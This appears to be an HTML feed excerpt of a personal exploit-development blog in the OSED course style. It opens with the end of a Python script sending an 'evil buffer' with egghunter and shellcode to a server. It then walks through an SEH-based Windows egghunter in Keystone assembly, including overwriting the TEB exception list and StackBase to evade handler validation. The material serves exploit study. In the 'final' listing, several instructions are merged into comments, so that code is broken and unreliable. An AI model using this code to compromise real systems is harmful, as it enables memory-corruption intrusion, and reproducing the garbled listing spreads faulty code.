</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">=</span> httpMethod <span style="color:#f92672">+</span> egghunter <span style="color:#f92672">+</span> inputBuffer <span style="color:#f92672">+</span> httpEndRequest <span style="color:#f92672">+</span> shellcode  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)  
</span></span><span style="display:flex;"><span> s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>connect((server, port))  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>send(buf)  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>close()  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Done!&#34;</span>)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error:  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Could not connect!&#34;</span>)
</span></span></code></pre></div>]]></description>
      
    </item>
    
    
    
    <item>
      <title></title>
      <link>http://localhost:1313/posts/osed_egghunter_seh/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/osed_egghunter_seh/</guid>
      <description><![CDATA[<p>When doing the classical egghunter shellcode, we observed that the NtAccessCheckAndAuditAlarm function did not work because the system call number was changed between Windows versions.
We fixed this by changing the system call number, but this fix comes at the cost of portability. In order for our exploit to work, we would have to identify the Windows version beforehand to craft a proper exploit.</p>
<p>In this case, we are going to make an egghunter that does not use the NtAccessCheckAndAuditAlarm function (remember that we used this function in order to <strong>check in a safe way if we have right access to the memory</strong>, as this function handles errors) and we are going to <strong>handle the error</strong> manually when checking if the memory region is accessible. This way, we won&rsquo;t depend on this system call and we won&rsquo;t need to have specific SSNs depending on the Windows versions.</p>
<p>The downside to this mechanism is that the egghunter requires additional assembly instructions <strong>in order to set up the SEH mechanism</strong>- the original egghunter was around 35 bytes whereas this egghunter is 60 bytes. However, it is still smaller than a normal shellcode and it can help if we have space.</p>
<p>Let&rsquo;s analyze the code of this SEH-based egghunter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>  
</span></span><span style="display:flex;"><span>CODE <span style="color:#f92672">=</span> (  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; start: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># jump to a negative call to dynamically  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># obtain egghunter position</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jmp get_seh_address ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; build_exception_record: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the address of the exception_handler  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># into ecx</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; pop ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov signature into eax  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov eax, 0x74303077 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push Handler of the  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># _EXCEPTION_REGISTRATION_RECORD structure</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; push ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push Next of the  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># _EXCEPTION_REGISTRATION_RECORD structure</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; push 0xffffffff ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># null out ebx  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; xor ebx, ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># overwrite ExceptionList in the TEB with a pointer  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># to our new _EXCEPTION_REGISTRATION_RECORD structure</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov dword ptr fs:[ebx], esp ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; is_egg: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push 0x02  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x02 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the value into ecx which will act  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># as a counter</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; pop ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov memory address into edi  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov edi, ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># check for our signature, if the page is invalid we  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># trigger an exception and jump to our exception_handler function</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; repe scasd ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># if we didn&#39;t find signature, increase ebx  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># and repeat</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jnz loop_inc_one ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># we found our signature and will jump to it  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; jmp edi ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_page: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># if page is invalid the exception_handler will  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># update eip to point here and we move to next page</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; or bx, 0xfff ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_one: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase ebx by one byte  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; inc ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># check for signature again  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; jmp is_egg ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; get_seh_address: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># call to a higher address to avoid null bytes &amp; push  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># return to obtain egghunter position</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; call build_exception_record ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push 0x0c onto the stack  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x0c ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the value into ecx  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov into eax the pointer to the CONTEXT  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># structure for our exception</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov eax, [esp+ecx] ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov 0xb8 into ecx which will act as an  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># offset to the eip</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov cl, 0xb8 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase the value of eip by 0x06 in our CONTEXT  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># so it points to the &#34;or bx, 0xfff&#34; instruction </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># to increase the memory page</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; add dword ptr ds:[eax+ecx], 0x06 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># save return value into eax  (IF YOU ANALYZE THIS DEEPLY YOU WILL FIND THAT THE ADDRESS OF PUSH 0x0C is on top of the stack, so doing a pop will store it)</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase esp to clean the stack for our call  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; add esp, 0x10 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push return value back into the stack  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># null out eax to simulate  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># ExceptionContinueExecution return</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; xor eax, eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># return  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; ret ;&#34;</span>  
</span></span><span style="display:flex;"><span>)  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Initialize engine in X86-32bit mode  </span>
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_X86, KS_MODE_32)
</span></span></code></pre></div><p>The code starts by executing a JMP instruction to a later part in the code, the <code>get_seh_address</code> label.
In this label, the first instruction is a <strong>relative CALL</strong> to the <code>build_exception_record</code> function.
When executing a <strong>relative call, the opcodes will match the offset from the current value of EIP.</strong> This would generate opcodes, but, as we are calling a <strong>function that is declared previosly in the code, the offset is negative, and we are doing a backward call, so there are not nullbytes as the offset is negative.</strong> That is why we declare our <code>build_exception_record</code> <strong>after</strong> in the code (Note: we learnt that the disposition of the labels <strong>is very important when doing shellcode!</strong>).
Also, as we are doing a <strong>call</strong> operation, the return address is stored in the stack (the CALL instruction does that) so that the program knows where to continue after the <code>build_exception_record</code> function has finished.
The <code>build_exception_record</code> function starts by popping the return value (which has just been stored in the stack, and represents the location of our egghunter) into the ecx register.
Then, the egg signature (0x74303077, t00w in little endian, remember that to store numbers and strings we have to store them in little endian) is moved to the eax register.
Then, we are going to add the two values of the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure in the stack, as we want to build our own <code>_EXCEPTION_REGISTRATION_RECORD</code>. We push our return address pointing to the next instruction after our CALL instruction (this is the value of the push 0x0c instruction) as the &ldquo;Handler&rdquo; member of the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure, and then we push the value of &ldquo;-1&rdquo; (0xffffffff) as our Next member. This signals <strong>that this registration record is tha last one, as there is no next member!</strong>. The OS won&rsquo;t search for more handlers after this one.
Then, we overwrite the <strong>first exception handler</strong> (that is pointed by <code>fs:[0]</code>) by nulling ebx, and putting the value of <code>fs[ebx]</code> to the values on the top of the stack. Wow! We just pushed both values of the <code>_EXCEPTION_REGISTRATION_RECORD</code> in the top of the stack! This basically overwrites the first exception handler for our custom one.
The next functions (is_egg, loop_inc_page, and loop_inc_one) are meant to search for our egg in memory. They are similar to the previous egghunter, but rather than executing the SCASD operation twice, we use the <strong>REPE</strong> instruction with the counter stored in ECX. This is done to minimize the size of the egghunter.
Given that we do not use any system call to check if a memory page is mapped or if we can access it, the access violation will be triggered on the REPE SCASD instruction. This will raise an exception that <strong>will trigger our custom handler</strong>. We want <strong>that our exception handler restores execution at the <code>loop_inc_page</code> function</strong>, which will move on to the next memory page and repeat the search.</p>
<p>During a previous module, we explored the prototype of the <code>_except_handler</code> function, the function of our handler:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> EXCEPTION_DISPOSITION <span style="color:#a6e22e">_except_handler</span> (<span style="color:#f92672">*</span>PEXCEPTION_ROUTINE) ( 
</span></span><span style="display:flex;"><span>IN PEXCEPTION_RECORD ExceptionRecord,
</span></span><span style="display:flex;"><span>IN VOID EstablisherFrame,
</span></span><span style="display:flex;"><span>IN OUT PCONTEXT ContextRecord,
</span></span><span style="display:flex;"><span>IN OUT PDISPATCHER_CONTEXT DispatcherContext );
</span></span></code></pre></div><p>When an exception is triggered, the OS will call our custom &ldquo;Handler&rdquo; function, passing these four parameters into the stack.
Therefore, these 4 parameters will be in the stack and we will be able to manipulate them.
The interesting parameter is the third parameter, the <code>PCONTEXT</code> parameter, which points to a CONTEXT structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt ntdll<span style="color:#f92672">!</span>_CONTEXT
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> ContextFlags     : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Dr0              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x008</span> Dr1              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x00c</span> Dr2              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x010</span> Dr3              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x014</span> Dr6              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x018</span> Dr7              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x08c</span> SegGs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x090</span> SegFs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x094</span> SegEs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x098</span> SegDs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x09c</span> Edi              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a0</span> Esi              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a4</span> Ebx              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a8</span> Edx              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0ac</span> Ecx              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b0</span> Eax              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b4</span> Ebp              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b8</span> Eip              : Uint4B <span style="color:#75715e">// INTERESTING
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0bc</span> SegCs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c0</span> EFlags           : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c4</span> Esp              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c8</span> SegSs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0cc</span> ExtendedRegisters : [<span style="color:#ae81ff">512</span>] UChar
</span></span></code></pre></div><p>This structure contains the processor register data at the time the exception occurred.
At the moment the exception occurs, all register values are stored in this structure. At offset 0x0b8 from the beginning of this structure, we find the EIP member. This member stores <strong>the memory address pointing to the instruction that caused the access violation.</strong>
This member is an important part of the egghunter resuming execution. <strong>Because we can modify this structure as part of our custom <code>_except_handler</code> implementation,</strong> we can also resume the execution flow at the <code>_loop_inc_page</code> function to move to the next memory page.</p>
<p>Our handler also needs to take care of the return value, in EAX. The result of the handler comes in the form of an <code>_EXCEPTION_DISPOSITION</code> structure containing four members, each of them acting as a return value:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">006</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_DISPOSITION
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_DISPOSITION
</span></span><span style="display:flex;"><span>ExceptionContinueExecution <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n0
</span></span><span style="display:flex;"><span>ExceptionContinueSearch <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n1
</span></span><span style="display:flex;"><span>ExceptionNestedException <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n2
</span></span><span style="display:flex;"><span>ExceptionCollidedUnwind <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n3
</span></span></code></pre></div><p>Therefore, to continue the execution, this value must be 0x00, to signal that the exception has been successfully handled, so that when the exception is triggered and our function is executed, we return to the <code>_loop_inc_page</code> value and continue the execution, in a loop.</p>
<p>So at the memory address of the &ldquo;Handler&rdquo; (our returning point to manage the exception) must:</p>
<ul>
<li>Retrieve the <code>ContextRecord</code> parameter which has been pushed to the stack, as well as the other 3 parameters.</li>
<li>Obtain the EIP member adding 0xB8 to the offset of <code>ContextRecord</code>.</li>
<li>We modify the value of this EIP member to the <code>loop_inc_page</code> memory address offset.</li>
<li>We save this value in EAX as we want to return to this address.</li>
<li>Reduce the stack size to clear the 4 arguments that are not needed anymore. We already got the EIP value and added the offset, and stored this value in EAX.</li>
<li>Push the EAX (address we want to return, which is the address of push 0x0c) into the stack.</li>
<li>Null out EAX to signal the OS that the exception has been managed ( <code>ExceptionContinueExecution</code>)</li>
<li>Perform a <code>ret</code> instruction to return to the <code>loop_inc_page</code> function.</li>
</ul>
<p>The <code>ret</code> at the end of our shellcode would return to the address of the push 0x0c instruction but as EAX is 0, the return address is not used and the EIP from the CONTEXT parameter in the stack is used to set up EIP. As we modified EIP to go to the add+1 page and continue searching, we repeat the search process again and again.</p>
<p><strong>TBD: I think that you can put any address in the top of the stack before using the <code>ret</code> instruction as the return address will never be used. EIP from the CONTEXT variable will be used.</strong></p>
<p>Next, this won&rsquo;t work at all. The following checks over our SEH handler will be performed:</p>
<ol>
<li>The memory address of our _EXCEPTION_REGISTRATION_RECORD structure needs to be higher than the StackLimit.</li>
<li>The memory address of our _EXCEPTION_REGISTRATION_RECORD structure plus 0x08 needs to be lower than the StackBase.</li>
<li>The memory address of our _EXCEPTION_REGISTRATION_RECORD structure needs to be aligned to the four bytes boundary.</li>
<li>The memory address of our _except_handler function needs to be located at a higher address than the StackBase.</li>
</ol>
<p>The three first ones are OK, as we created a <code>EXCEPTION_REGISTRATION_RECORD</code> structure in the stack, so it is between the StackLimit and StackBase and will meet those conditions always.
But our custom function is also inside the stack, and condition 4 tries to check if it is located at a higher memory address than the StackBase. This check is implemented because the stack is only supposed to contain data. Functions can read or write to it but the stack is not supposed to contain executable code.
How do we manage to execute our function then?
Well, we have modified the field of the TEB corresponding to the address of the first handler to be executed.
Why don&rsquo;t we modify the value of the StackBase field of the TEB to be lower than the address of our <code>_except_handler</code> function, but higher than the value of our <code>_EXCEPTION_REGISTRATION_RECORD</code> structure?</p>
<p>The egghunter already gathered the address of the <code>except_handler</code> function dinamically, so we could substract a small number of bytes from it (not much, so the StackBase is still higher than our <code>_EXCEPTION_REGISTRATION_RECORD</code> structure) and use that to overwrite the StackBase value.
This is what is updated in the egghunter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># overwrite ExceptionList in the TEB with a pointer </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># to our new _EXCEPTION_REGISTRATION_RECORD structure </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov dword ptr fs:[ebx], esp ;&#34;</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e"># subtract 0x04 from the pointer</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># to exception_handler </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; sub ecx, 0x04 ;&#34;</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e"># add 0x04 to ebx </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; add ebx, 0x04 ;&#34;</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e"># overwrite the StackBase in the TEB to the address -4, which is in ECX</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># this way, Stackbase will be lower than our except_handler function!</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov dword ptr fs:[ebx], ecx ;&#34;</span>
</span></span></code></pre></div><p>Now the verification is done. Remember that this module does not have SafeSEH so we don&rsquo;t need to bypass it, but it would be another protection to bypass.</p>
<p>The final SEH egghunter would be this one:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>  
</span></span><span style="display:flex;"><span>CODE <span style="color:#f92672">=</span> (  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; start: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># jump to a negative call to dynamically  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># obtain egghunter position&#34; jmp get_seh_address ;&#34;  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; build_exception_record: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the address of the exception_handler  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># into ecx&#34; pop ecx ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov signature into eax  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov eax, 0x74303077 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push Handler of the  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># _EXCEPTION_REGISTRATION_RECORD structure&#34; push ecx ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push Next of the  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># _EXCEPTION_REGISTRATION_RECORD structure&#34; push 0xffffffff ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># null out ebx  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; xor ebx, ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># overwrite ExceptionList in the TEB with a pointer  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># to our new _EXCEPTION_REGISTRATION_RECORD structure&#34; mov dword ptr fs:[ebx], esp ;&#34;  </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># subtract 0x04 from the pointer (address) to exception_handler  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; sub ecx, 0x04 ;&#34;</span> <span style="color:#75715e"># add 0x04 to ebx so it points to TEB StackBase field instead of the first element of TEB  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; add ebx, 0x04 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># overwrite the StackBase in the TEB  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov dword ptr fs:[ebx], ecx ;&#34;</span> <span style="color:#e6db74">&#34; is_egg: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push 0x02  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x02 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the value into ecx which will act  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># as a counter&#34; pop ecx ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov memory address into edi  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov edi, ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># check for our signature, if the page is invalid we  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># trigger an exception and jump to our exception_handler function&#34; repe scasd ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># if we didn&#39;t find signature, increase ebx  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># and repeat&#34; jnz loop_inc_one ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># we found our signature and will jump to it  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; jmp edi ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_page: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># if page is invalid the exception_handler will  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># update eip to point here and we move to next page&#34; or bx, 0xfff ;&#34;  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_one: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase ebx by one byte  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; inc ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># check for signature again  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; jmp is_egg ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; get_seh_address: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># call to a higher address to avoid null bytes &amp; push  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># return to obtain egghunter position&#34; call build_exception_record ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push 0x0c onto the stack  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x0c ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the value into ecx  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov into eax the pointer to the CONTEXT  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># structure for our exception&#34; mov eax, [esp+ecx] ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov 0xb8 into ecx which will act as an  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># offset to the eip&#34; mov cl, 0xb8 ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase the value of eip by 0x06 in our CONTEXT  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># so it points to the &#34;or bx, 0xfff&#34; instruction # to increase the memory page&#34; add dword ptr ds:[eax+ecx], 0x06 ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># save return value into eax  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase esp to clean the stack for our call  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; add esp, 0x10 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push return value back into the stack  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># null out eax to simulate  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># ExceptionContinueExecution return&#34; xor eax, eax ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># return  </span>
